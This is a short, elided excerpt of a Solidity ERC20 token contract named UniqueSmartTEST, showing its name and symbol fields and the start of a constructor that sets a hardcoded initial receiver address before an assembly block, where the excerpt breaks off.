...
contract UniqueSmartTEST is ERC20Detailed, Ownable {
    ...
    string public _name = "UniqueSmartTEST";
    string public _symbol = "SMARTTEST";
    ...
    constructor() ERC20Detailed("UniqueSmartTEST", "SMARTTEST", uint8(DECIMALS)) Ownable() {
        ...
        address receiver;
        address initialReceiver = 0xe313dCa4B69091ACa986E13438a3c5AdBE42d35A;
        assembly {
